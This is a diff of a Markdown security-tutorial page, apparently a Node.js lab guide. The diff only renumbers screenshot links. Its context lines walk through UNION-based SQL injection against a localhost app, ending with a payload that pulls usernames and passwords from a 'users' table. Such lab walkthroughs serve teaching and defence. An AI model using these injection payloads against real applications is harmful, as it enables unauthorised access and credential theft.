@@ -85,8 +85,6 @@ This query results in an error, this is due to the fact that the original query 
 
 ![](../../.gitbook/assets/nodejs/SQLI/6.png)
 
-![](../../.gitbook/assets/nodejs/SQLI/7.png)
-
 ```text
 http://localhost:5000/home/1 union select 1,2,3
 ```
@@ -97,19 +95,19 @@ Notice how "title" and "content" became placeholders for data we want to retriev
 
 Now that we determined the number of columns we need to take an educated guess for the table we want to steal sensitive information from. Again we can see if we try to query a non existent table we get an error. For a correct table we see the application function as intended.
 
-![](../../.gitbook/assets/nodejs/SQLI/8.png)
+![](../../.gitbook/assets/nodejs/SQLI/7.png)
 
 ```text
 http://localhost:5000/home/1 union select 1,2,3 from user
 ```
 
-![](../../.gitbook/assets/nodejs/SQLI/9.png)
+![](../../.gitbook/assets/nodejs/SQLI/8.png)
 
 ```text
 http://localhost:5000/home/1 union select 1,2,3 from users
 ```
 
-![](../../.gitbook/assets/nodejs/SQLI/10.png)
+![](../../.gitbook/assets/nodejs/SQLI/9.png)
 
 ```text
 http://localhost:5000/home/1 union select 1,username,password from users
